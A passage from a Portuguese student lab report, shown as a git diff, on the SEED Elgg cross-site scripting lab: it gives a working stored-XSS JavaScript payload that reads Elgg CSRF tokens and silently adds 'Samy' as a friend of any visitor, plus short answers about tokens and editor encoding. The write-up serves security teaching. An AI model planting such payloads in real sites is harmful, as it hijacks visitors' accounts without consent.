@@ -50,6 +50,47 @@ Sem surpresa, chegou ao terminal as cookies de Boby.
 
 ## Tarefa 4
 
+Por forma a perceber como executar o ataque, foi necessário compreender como funciona o mecanismo de adicionar um amigo. Com a ferramenta *HTTP Header Live* detetaram-se pedidos deste género a cada novo amigo:
+
+![/imgs10/amizadeAliceBob.png](/imgs10/amizadeAliceBob.png)
+
+Com a repetição de pedidos percebeu-se que a variável *friend* era igual a um identificador para a pessoa que se queria adicionar como amiga. Por outro lado, a restante parte do *link* era constituída pela sequência *ts*, *token*, *ts* e *token* que são calculados no *script* fornecido. Como tal, bastava modificar o script para
+
+```js
+<script type="text/javascript">
+window.onload = function () {
+var Ajax=null;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+//Construct the HTTP request to add Samy as a friend.
+var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
+//Create and send Ajax request to add friend
+Ajax=new XMLHttpRequest();
+Ajax.open("GET", sendurl, true);
+Ajax.send();
+}
+</script>
+```
+
+e colocá-lo na secção *About me* do perfil do Samy. 
+
+Como espectável, iniciando sessão como outro utilizador e visitanto o perfil de *Samy* este é adicionado como amigo,
+
+![/imgs10/sammyFriend.png](/imgs10/sammyFriend.png)
+
+
+### Questão 1
+
+Em Elgg, as todas as ações requerem *tokens* CSRF (por questões de segurança) que, por vezes, têm de ser gerados manualmente. As linhas 1 e 2 são a geração destes *tokens*. Mais informações sobre estes *tokens* podem ser vistas no seguinte link: http://learn.elgg.org/en/stable/guides/actions.html#security
+
+### Questão 2
+
+Se apenas fosse usado *Editor Mode*, o texto inserido teria os sues carateres especiais "<", ">" codificados como se mostra abaixo.
+
+![/imgs10/editorMode.png](/imgs10/editorMode.png)
+
+Desta forma, o código não seria reconhecido como *script* e, logo, não seria possível corrê-lo.
+
 ## CTF - Desafio 1
 O enunciado sugere que o formulário de se procurem fragilidades no formulário de submissão. 
 
